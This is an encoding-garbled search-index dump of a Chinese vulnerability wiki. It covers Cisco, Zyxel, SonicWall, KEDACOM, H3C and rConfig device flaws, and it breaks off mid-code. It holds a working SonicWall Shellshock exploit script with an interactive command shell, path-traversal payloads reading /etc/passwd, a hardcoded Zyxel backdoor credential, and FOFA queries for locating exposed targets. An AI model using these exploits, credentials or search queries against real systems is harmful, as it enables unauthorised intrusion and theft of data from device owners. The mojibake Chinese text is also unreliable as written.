Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/Cisco/Cisco HyperFlex HX upload ‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†ÊºèÊ¥û CVE-2021-1499.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/Cisco/Cisco HyperFlex HX upload ‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†ÊºèÊ¥û CVE-2021-1499.html","title":"Cisco HyperFlex HX upload ‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†ÊºèÊ¥û CVE-2021-1499","keywords":"","body":"Cisco HyperFlex HX upload ‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†ÊºèÊ¥û CVE-2021-1499 ÊºèÊ¥ûÊèèËø∞ ÊÄùÁßëÂú®Á†îÁ©∂‰∫∫ÂëòNikita AbramovÂíåMikhail KlyuchnikovÂèëÁé∞ÁöÑHyperFlex HXÊï∞ÊçÆÂπ≥Âè∞‰∏≠‰øÆÂ§ç‰∫Ü‰∏§‰∏™Unauth RCEÂíå‰∏Ä‰∏™‰ªªÊÑèÊñá‰ª∂‰∏äËΩΩ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Cisco HyperFlex HX ÊºèÊ¥ûÂ§çÁé∞ Âá∫Áé∞ÊºèÊ¥ûÁöÑ‰ª£Á†Å‰∏∫ public void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { this.isMultipart = ServletFileUpload.isMultipartContent(request); response.setContentType(\"application/json\"); PrintWriter out = response.getWriter(); if (!this.isMultipart) { out.println(\"{\\\"result\\\": \\\"Invalid content-type.\\\"}\"); logger.error(\"{\\\"result\\\": \\\"Invalid content-type. Must be multi-part\\\"}\"); response.setStatus(400); return; } ServletFileUpload upload = new ServletFileUpload(); upload.setSizeMax(this.maxFileSize); FileOutputStream fout = null; InputStream stream = null; try { FileItemIterator iter = upload.getItemIterator(request); while (iter.hasNext()) { try { FileItemStream fi = iter.next(); stream = fi.openStream(); String uploadedFileName = this.dirPath + \"/\" + fi.getName(); File uploadedFile = new File(uploadedFileName); fout = new FileOutputStream(uploadedFile); byte[] buffer = new byte[1024]; int len; while ((len = stream.read(buffer, 0, buffer.length)) != -1) fout.write(buffer, 0, len); out.println(\"{\\\"result\\\": \\\"filename: \" + uploadedFileName + \"\\\"}\"); logger.debug(\"{\\\"result\\\": \\\"filename: \" + uploadedFileName + \"\\\"}\"); } catch (org.apache.commons.fileupload.MultipartStream.MalformedStreamException ex) { logger.info(\"MalformedStreamException during file upload servlet stream processing: \" + ex); } finally { if (fout != null) { logger.info(\"Closing fout\"); fout.close(); } if (stream != null) { logger.info(\"Closing stream\"); stream.close(); } } } } catch (Exception ex) { out.println(\"{\\\"result\\\": \\\"Upload failed: \" + ex.getMessage() + \"\\\"}\"); logger.error(\"{\\\"result\\\": \\\"Upload failed: \" + ex.getMessage() + \"\\\"}\"); logger.error(\"Exception during file upload servlet stream processing: \" + ex); response.setStatus(500); } POC‰∏∫ curl -v http://xxx.xxx.xxx.xxx/upload -F x=@/dev/null Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/Zyxel/":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/Zyxel/","title":"Zyxel","keywords":"","body":"Zyxel Zyxel Á°¨ÁºñÁ†ÅÂêéÈó®Ë¥¶Êà∑ÊºèÊ¥û CVE-2020-29583 Zyxel NBG2105 Ë∫´‰ªΩÈ™åËØÅÁªïËøá CVE-2021-3297 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/Zyxel/Zyxel Á°¨ÁºñÁ†ÅÂêéÈó®Ë¥¶Êà∑ÊºèÊ¥û CVE-2020-29583.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/Zyxel/Zyxel Á°¨ÁºñÁ†ÅÂêéÈó®Ë¥¶Êà∑ÊºèÊ¥û CVE-2020-29583.html","title":"Zyxel Á°¨ÁºñÁ†ÅÂêéÈó®Ë¥¶Êà∑ÊºèÊ¥û CVE-2020-29583","keywords":"","body":"Zyxel Á°¨ÁºñÁ†ÅÂêéÈó®Ë¥¶Êà∑ÊºèÊ¥û CVE-2020-29583 ÊºèÊ¥ûÊèèËø∞ ZyxelÂõ∫‰ª∂‰∏≠ÂèëÁé∞ÁöÑÂêéÈó®Ë¢´Áß∞‰∏∫ÂÖ≥ÈîÆÂõ∫‰ª∂ÊºèÊ¥ûÔºåCVEÁºñÂè∑CVE-2020-29583ÔºåÂæóÂàÜ‰∏∫7.8 CVSS„ÄÇËôΩÁÑ∂CVSSËØÑÂàÜÁúã‰ºº‰∏çÊòØÂæàÈ´òÔºå‰ΩÜÂç¥‰∏çÂèØÂ∞èËßë„ÄÇÁ†îÁ©∂‰∫∫ÂëòË°®Á§∫ÔºåËøôÊòØ‰∏Ä‰∏™ÊûÅ‰∏∫‰∏•ÈáçÁöÑÊºèÊ¥ûÔºåÊâÄÊúâËÄÖÂøÖÈ°ªÁ´ãÂç≥Êõ¥Êñ∞ÂÖ∂Á≥ªÁªü„ÄÇÂõ†‰∏∫‰ªª‰Ωï‰∫∫ÈÉΩÂèØ‰ª•ËΩªÊùæÂà©Áî®Ëøô‰∏™ÊºèÊ¥ûÔºå‰ªéDDoSÂÉµÂ∞∏ÁΩëÁªúËøêËê•ÂïÜÂà∞ÂãíÁ¥¢ËΩØ‰ª∂Âõ¢‰ΩìÂíåÊîøÂ∫úËµÑÂä©ÁöÑÈªëÂÆ¢„ÄÇ ÈÄöËøáÊª•Áî®ÂêéÈó®Ë¥¶Êà∑ÔºåÁΩëÁªúÁΩ™ÁäØÂèØ‰ª•ËÆøÈóÆÊòìÂèóÊîªÂáªÁöÑËÆæÂ§áÂπ∂ÊÑüÊüìÂÜÖÈÉ®ÁΩëÁªú‰ª•ÂèëËµ∑ÂÖ∂‰ªñÊîªÂáª„ÄÇÊîªÂáªËÄÖÂèØ‰ª•‰ΩøÁî®ÁÆ°ÁêÜÁâπÊùÉÁôªÂΩïËÆæÂ§áÔºåÂπ∂ËΩªÊòìÁ†¥ÂùèÁΩëÁªúËÆæÂ§á„ÄÇ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Zyxel USGÁ≥ªÂàó Zyxel ATPÁ≥ªÂàó Zyxel NCXÁ≥ªÂàó Zyxel USG FIEXÁ≥ªÂàó Zyxel VPNÁ≥ªÂàó FOFA [!NOTE] title=\"USG40\" \"NXC2500\" Á≠â ÊºèÊ¥ûÂ§çÁé∞ ÂàÜÊûêÂõ∫‰ª∂‰∏≠Êúâ FTP ÁöÑÂêéÈó®ÂØÜÁ†Å ‰ΩøÁî®ÊºèÊ¥ûÊâ´ÊèèËÑöÊú¨ÊâæÂà∞ÊòìÂèóÊîªÂáªÁöÑÁâàÊú¨ ËøõË°åÊîªÂáªÔºåÁôªÂΩï‰∏∫ÂêéÈó®ÁÆ°ÁêÜÂëòË¥¶Êà∑ zyfwp:PrOw!aN_fXp ËøôÈáå‰ΩøÁî®GobyËÆæÁΩÆÂ≠óÂÖ∏Êâ´ÊèèÂç≥ÂèØ ÂèÇËÄÉÊñáÁ´† scan_CVE-2020-29583 Zyxel USG Series Ë¥¶Êà∑Á°¨ÁºñÁ†ÅÊºèÊ¥ûÔºàCVE-2020-29583Ôºâ Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/Zyxel/Zyxel NBG2105 Ë∫´‰ªΩÈ™åËØÅÁªïËøá CVE-2021-3297.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/Zyxel/Zyxel NBG2105 Ë∫´‰ªΩÈ™åËØÅÁªïËøá CVE-2021-3297.html","title":"Zyxel NBG2105 Ë∫´‰ªΩÈ™åËØÅÁªïËøá CVE-2021-3297","keywords":"","body":"Zyxel NBG2105 Ë∫´‰ªΩÈ™åËØÅÁªïËøá CVE-2021-3297 ÊºèÊ¥ûÊèèËø∞ Zyxel NBG2105 Â≠òÂú®Ë∫´‰ªΩÈ™åËØÅÁªïËøáÔºåÊîªÂáªËÄÖÈÄöËøáÊõ¥Êîπ loginÂèÇÊï∞ÂèØÁî®ÂÆûÁé∞ÂêéÂè∞ÁôªÈôÜ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Zyxel NBG2105 FOFA [!NOTE] app=\"ZyXEL-NBG2105\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã ÂÖ∂‰∏≠ÂâçÁ´ØÊñá‰ª∂ /js/util_gw.js Â≠òÂú®ÂâçÁ´ØÂØπ Cookie loginÂèÇÊï∞ÁöÑÊ†°È™å ÂèØ‰ª•ÁúãÂà∞Ê£ÄÊµãÂà∞ Cookie‰∏≠ÁöÑ login=1 ÂàôË∑≥ËΩ¨ home.html function setCookie() //login_ok.htm use { document.cookie=\"login=1\"; MM_goToURL('parent', 'home.htm'); } ËØ∑Ê±ÇÂ¶Ç‰∏ãÂàô‰ºö‰ª•ÁÆ°ÁêÜÂëòË∫´‰ªΩË∑≥ËΩ¨Âà∞ home.htmÈ°µÈù¢ http://xxx.xxx.xxx.xxx/login_ok.htm Cookie: login=1; ÂèÇËÄÉÊñáÁ´† https://github.com/nieldk/vulnerabilities/blob/main/zyxel%20nbg2105/Admin%20bypass Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/SonicWall/":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/SonicWall/","title":"SonicWall","keywords":"","body":"SonicWall SSL-VPN ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û SonicWall SSL-VPN ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/SonicWall/SonicWall SSL-VPN ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/SonicWall/SonicWall SSL-VPN ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html","title":"SonicWall SSL-VPN ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û","keywords":"","body":"SonicWall SSL-VPN ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ SonicWall SSL-VPN ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÂú®1Êúà24Êó•Ë¢´ÂÖ¨ÂºÄ EXPÔºåÊ≠§ËÆæÂ§áÂ≠òÂú®ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û ÊºèÊ¥ûÂΩ±Âìç [!NOTE] SonicWall SSL-VPN FOFA [!NOTE] app=\"SONICWALL-SSL-VPN\" ÊºèÊ¥ûÂ§çÁé∞ Âá∫Áé∞ÊºèÊ¥ûÁöÑÊñá‰ª∂‰∏∫ /cgi-bin/jarrewrite.sh #!/bin/bash # jarrewrite.sh: # Script takes a jar/class file and a working directory; modifies class files # within the jar and repackages them. USAGE_STR=\"Usage: $0 \" # Validate number of args if [ $# -ne 2 ]; then echo ${USAGE_STR}; exit -1; fi for param in $*; do if [ \"$param\" == \"-h\" ]; then echo ${USAGE_STR}; exit 1; fi done # constants BOUNDARY=\"-------------------------------------------------------------\" BASE_DIR=/tmp JAVA_SRC=$1 WDIR=$2 CWD=`pwd` FULL_JAVA_SRC_PATH=${BASE_DIR}/${WDIR}/${JAVA_SRC} CLASSES_DIR=classes META_INF_DIR=${BASE_DIR}/${WDIR}/${CLASSES_DIR}/META-INF MANIFEST=${META_INF_DIR}/MANIFEST.MF MANIFEST_DIGEST_FILE=${META_INF_DIR}/SWALL_SIGNATURE.SF SIGNATURE_FILE=${META_INF_DIR}/SWALL_SIGNATURE.DSA CODESIGNER_CRT=./../../var/cs_cert/httprpCodeSignerX509Crt.pem CODESIGNER_PVTKEY=./../../var/cs_cert/httprpCodeSignerPvtkey.pem DO_SIGN=0 if [ ! -f ${FULL_JAVA_SRC_PATH} ];then echo \"File not found: ${FULL_JAVA_SRC_PATH}\"; exit -2; fi if [ ${JAVA_SRC##*.} == \"jar\" ] # Using bracket in variable substitution. then # organize mkdir ${BASE_DIR}/$WDIR/$CLASSES_DIR # unzip jar unzip -d ${BASE_DIR}/${WDIR}/${CLASSES_DIR} ${FULL_JAVA_SRC_PATH}; # Simple sanity check to see if the JAR has already been signed. # FIXME: This is not a complete check,because the original JAR signature # has to be verified completely otherwise a malicious applet # could access the local resources with SSL VPN signing it. old_sf_files=`/bin/ls ${META_INF_DIR}/*.[sS][fF] ` old_sign_files=`/bin/ls ${META_INF_DIR}/*.[rRdD][sS][aA] ` for sf_file in $old_sf_files do for sign_file in $old_sign_files do DO_SIGN=1; break done; break; done # remove all manifest info including signatures # remove all that match mf|MF|sf|SF or dsa|DSA|rsa|RSA rm -f ${BASE_DIR}/${WDIR}/${CLASSES_DIR}/META-INF/*.[sSmM][fF] ${BASE_DIR}/${WDIR}/${CLASSES_DIR}/META-INF/*.?[sS][aA] OUTPUT_JAR=\"${FULL_JAVA_SRC_PATH}\" classfiles=`/usr/bin/find ${BASE_DIR}/${WDIR}/${CLASSES_DIR} -type f` #New Manifest file MANIFEST_MAIN_ATTR=\"Manifest-Version: 1.0\\nCreated-By: 1.0 (SonicWALL Inc.)\\n\" echo -e \"Creating Manifest file ... \" echo -e ${MANIFEST_MAIN_ATTR} > ${MANIFEST} for file in $classfiles do echo $BOUNDARY echo $file echo $BOUNDARY ./jdasm $file $file #Update manifest file SHA1_MANIFEST_ENTRY_CLASS=`openssl dgst -sha1 -binary $file | openssl base64` MANIFEST_ENTRY=\"Name: ${file##${BASE_DIR}/${WDIR}/${CLASSES_DIR}/}\\nSHA1-Digest: ${SHA1_MANIFEST_ENTRY_CLASS}\\n\" echo -e ${MANIFEST_ENTRY} >> ${MANIFEST} echo $BOUNDARY done if [ ${DO_SIGN} == 1 ]; then echo -e \"Creating Manifest Signature file and Signature block\" >> $OUTLOG /usr/sbin/sw_jarsigner -m ${MANIFEST} -s ${MANIFEST_DIGEST_FILE} -S ${SIGNATURE_FILE} -c ${CODESIGNER_CRT} -k ${CODESIGNER_PVTKEY} fi rm -f ${FULL_JAVA_SRC_PATH} cd ${BASE_DIR}/${WDIR}/${CLASSES_DIR}; zip -r ${OUTPUT_JAR} * cd ${CWD} # clean rm -Rf ${BASE_DIR}/${WDIR}/${CLASSES_DIR} elif [ ${JAVA_SRC##*.} == \"class\" ]; then # if file is a class if [ ! -e ${FULL_JAVA_SRC_PATH} ];then echo \"File not found: ${FULL_JAVA_SRC_PATH}\"; exit -2; fi ./jdasm ${FULL_JAVA_SRC_PATH} ${FULL_JAVA_SRC_PATH}; fi echo \"Recursive Class Rewrite Completed.\" exit 0; Ëøô‰∏™Êñá‰ª∂Â≠òÂú®ÂëΩ‰ª§Ê≥®ÂÖ•ÊºèÊ¥ûÔºåÊºèÊ¥ûËß¶ÂèëÂú® Usage-Agent ÂèëÈÄÅÂ¶Ç‰∏ãËØ∑Ê±ÇÂç≥ÂèØÂëΩ‰ª§ÊâßË°å GET https://xxx.xxx.xxx.xxx/cgi-bin/jarrewrite.sh User-Agent: () { :; }; echo ; /bin/bash -c 'cat /etc/passwd' ÂèëÈÄÅËØ∑Ê±Ç‰ºö‰∏ãËΩΩ‰∏Ä‰∏™Êñá‰ª∂ÔºåÊñá‰ª∂ÂÜÖÂÆπ‰∏∫ÂëΩ‰ª§ÊâßË°åÁöÑÁªìÊûú ÊºèÊ¥ûÂà©Áî®POC import requests import sys import random from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mVersion: SonicWall SSL-VPN \\033[0m') print('+ \\033[36m‰ΩøÁî®Ê†ºÂºè: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mCmd >>> whoami \\033[0m') print('+------------------------------------------') def POC_1(target_url, cmd): vuln_url = target_url + \"/cgi-bin/jarrewrite.sh\" headers = {\"User-Agent\": \"() { :; }; echo ; /bin/bash -c '%s'\" % (cmd)} try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[32m[o] Ê≠£Âú®ËØ∑Ê±Ç {}/cgi-bin/jarrewrite.sh \\033[0m\".format(target_url)) if \"root\" in response.text and response.status_code == 200: print(\"\\033[32m[o] ÁõÆÊ†á {}Â≠òÂú®ÊºèÊ¥û ,ÊàêÂäüÊâßË°å cat /etc/passwd \\033[0m\".format(target_url)) print(\"\\033[32m[o] ÂìçÂ∫î‰∏∫:\\n{} \\033[0m\".format(response.text)) while True: cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": sys.exit(0) else: POC_2(target_url, cmd) else: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\", e) def POC_2(target_url, cmd): vuln_url = target_url + \"/cgi-bin/jarrewrite.sh\" headers = {\"User-Agent\": \"() { :; }; echo ; /bin/bash -c '%s'\" % (cmd)} try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[32m[o] ÂìçÂ∫î‰∏∫:\\n{} \\033[0m\".format(response.text)) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\", e) if __name__ == '__main__': title() cmd = 'cat /etc/passwd' target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url, cmd) Goby & POC [!NOTE] Â∑≤‰∏ä‰º† https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC ÁõÆÂΩï‰∏≠ SonicWall_SSL_VPN_RCE.json ÂèÇËÄÉÊñáÁ´† https://darrenmartyn.ie/2021/01/24/visualdoor-sonicwall-ssl-vpn-exploit/ Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/KEDACOM/":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/KEDACOM/","title":"KEDACOM","keywords":"","body":"KEDACOM KEDACOM Êï∞Â≠óÁ≥ªÁªüÊé•ÂÖ•ÁΩëÂÖ≥ ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/KEDACOM/KEDACOMÊï∞Â≠óÁ≥ªÁªüÊé•ÂÖ•ÁΩëÂÖ≥ ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/KEDACOM/KEDACOMÊï∞Â≠óÁ≥ªÁªüÊé•ÂÖ•ÁΩëÂÖ≥ ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û.html","title":"KEDACOMÊï∞Â≠óÁ≥ªÁªüÊé•ÂÖ•ÁΩëÂÖ≥ ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û","keywords":"","body":"KEDACOM Êï∞Â≠óÁ≥ªÁªüÊé•ÂÖ•ÁΩëÂÖ≥ ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ KEDACOM Êï∞Â≠óÁ≥ªÁªüÊé•ÂÖ•ÁΩëÂÖ≥ Â≠òÂú®‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥ûÔºåÊîªÂáªËÄÖÈÄöËøáÊûÑÈÄ†ËØ∑Ê±ÇÂèØ‰ª•ËØªÂèñÊúçÂä°Âô®‰ªªÊÑèÊñá‰ª∂ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] KEDACOM Êï∞Â≠óÁ≥ªÁªüÊé•ÂÖ•ÁΩëÂÖ≥ FOFA [!NOTE] (app=\"KEDACOM-DVRÊé•ÂÖ•ÁΩëÂÖ≥\") && (is_honeypot=false && is_fraud=false) ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã ‰ΩøÁî®POCËØªÂèñ /etc/hosts /gatewayweb/FileDownloadServlet?fileName=test.txt&filePath=../../../../../../../../../../Windows/System32/drivers/etc/hosts%00.jpg&type=2 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/H3C/":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/H3C/","title":"H3C","keywords":"","body":"H3C H3C SecPath ‰∏ã‰∏Ä‰ª£Èò≤ÁÅ´Â¢ô ‰ªªÊÑèÊñá‰ª∂‰∏ãËΩΩÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/H3C/H3C SecPath ‰∏ã‰∏Ä‰ª£Èò≤ÁÅ´Â¢ô  ‰ªªÊÑèÊñá‰ª∂‰∏ãËΩΩÊºèÊ¥û.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/H3C/H3C SecPath ‰∏ã‰∏Ä‰ª£Èò≤ÁÅ´Â¢ô  ‰ªªÊÑèÊñá‰ª∂‰∏ãËΩΩÊºèÊ¥û.html","title":"H3C SecPath ‰∏ã‰∏Ä‰ª£Èò≤ÁÅ´Â¢ô  ‰ªªÊÑèÊñá‰ª∂‰∏ãËΩΩÊºèÊ¥û","keywords":"","body":"H3C SecPath ‰∏ã‰∏Ä‰ª£Èò≤ÁÅ´Â¢ô ‰ªªÊÑèÊñá‰ª∂‰∏ãËΩΩÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ H3C SecPath ‰∏ã‰∏Ä‰ª£Èò≤ÁÅ´Â¢ô Â≠òÂú®ÂäüËÉΩÁÇπÂØºËá¥‰ªªÊÑèÊñá‰ª∂‰∏ãËΩΩÊºèÊ¥ûÔºåÊîªÂáªËÄÖÈÄöËøáÊºèÊ¥ûÂèØ‰ª•Ëé∑ÂèñÊïèÊÑü‰ø°ÊÅØ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] H3C SecPath FOFA [!NOTE] title=\"Web user login\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã Â≠òÂú®ÊºèÊ¥ûÁÇπÁöÑÂäüËÉΩÊúâ‰∏§‰∏™ ÁÇπÂáª‰∏ãËΩΩÊäìÂåÖÊõ¥ÊîπËØ∑Ê±Ç Âπ∂‰∏îÂú®Êú™Ë∫´‰ªΩÈ™åËØÅÁöÑÊÉÖÂÜµ‰∏≠Ôºå‰πüÂèØ‰ª•ËØ∑Ê±Ç‰∏ãËΩΩÊïèÊÑüÊñá‰ª∂ È™åËØÅPOC /webui/?g=sys_dia_data_check&file_name=../../etc/passwd /webui/? g=sys_capture_file_download&name=../../../../../../../../etc/passwd ‚Äã Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/rConfig/":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/rConfig/","title":"rConfig","keywords":"","body":"rConfigÁ±ª‰ºº- rConfig useradmin.inc.php ‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û rConfig userprocess.php ‰ªªÊÑèÁî®Êà∑ÂàõÂª∫ÊºèÊ¥û rConfig ajaxArchiveFiles.php ÂêéÂè∞ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û rConfig ajaxEditTemplate.php ÂêéÂè∞ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/rConfig/rConfig ajaxArchiveFiles.php ÂêéÂè∞ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/rConfig/rConfig ajaxArchiveFiles.php ÂêéÂè∞ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html","title":"rConfig ajaxArchiveFiles.php ÂêéÂè∞ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û","keywords":"","body":"rConfig ajaxArchiveFiles.php ÂêéÂè∞ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ rConfig ajaxArchiveFiles.phpÊñá‰ª∂‰∏≠Áî±‰∫éÂØπpathÂèÇÊï∞ÂíåextÂèÇÊï∞ËøõË°åÂëΩ‰ª§ÊãºÊé•ÔºåÂØºËá¥ÊîªÂáªËÄÖÂèØ‰ª•ËøúÁ®ãÂëΩ‰ª§ÊâßË°åËé∑ÂèñÊúçÂä°Âô®ÊùÉÈôê ÊºèÊ¥ûÂΩ±Âìç [!NOTE] rConfig FOFA [!NOTE] app=\"rConfig\" ÊºèÊ¥ûÂ§çÁé∞ Â≠òÂú®ÊºèÊ¥ûÁöÑÊñá‰ª∂‰∏∫ /home/rconfig/www/lib/ajaxHandlers/ajaxArchiveFiles.php logged_in) { echo 'Don\\'t bother trying to hack me!!!!! This hack attempt has been logged'; $log->Warn(\"Security Issue: Some tried to access this file directly from IP: \" . $_SERVER['REMOTE_ADDR'] . \" & Username: \" . $session->username . \" (File: \" . $_SERVER['PHP_SELF'] . \")\"); // need to add authentication to this script header(\"Location: \" . $config_basedir . \"login.php\"); } else { //archive logs files $mainPath = $_GET['path']; $archiveMainPath = $mainPath . \"archive/\"; $ext = \"*.\" . $_GET['ext']; $fullpath = $mainPath . $ext; // create and archive dir if not already created if (!is_dir($archiveMainPath)) { mkdir(\"$archiveMainPath\"); } $today = date(\"Ymd\"); $commandString = \"sudo -u apache zip -r -j \" . $archiveMainPath . \"filename\" . $today . \".zip \" . $mainPath . $ext; exec($commandString); foreach (glob($fullpath) as $v) { unlink($v); } $fileCount = count(glob($mainPath . $ext)); if ($fileCount > 0) { $response = json_encode(array( 'failure' => true )); } else { $response = json_encode(array( 'success' => true )); } echo $response; } // end session check ÂÖ≥ÈîÆ‰ª£Á†ÅÂ¶Ç‰∏ã $mainPath = $_GET['path']; $archiveMainPath = $mainPath . \"archive/\"; $ext = \"*.\" . $_GET['ext']; $fullpath = $mainPath . $ext; // create and archive dir if not already created if (!is_dir($archiveMainPath)) { mkdir(\"$archiveMainPath\"); } $today = date(\"Ymd\"); $commandString = \"sudo -u apache zip -r -j \" . $archiveMainPath . \"filename\" . $today . \".zip \" . $mainPath . $ext; exec($commandString); $mainPathÂèÇÊï∞Âíå$extÂèÇÊï∞ Áî®Êà∑ÂèØÊéß $commandString = \"sudo -u apache zip -r -j 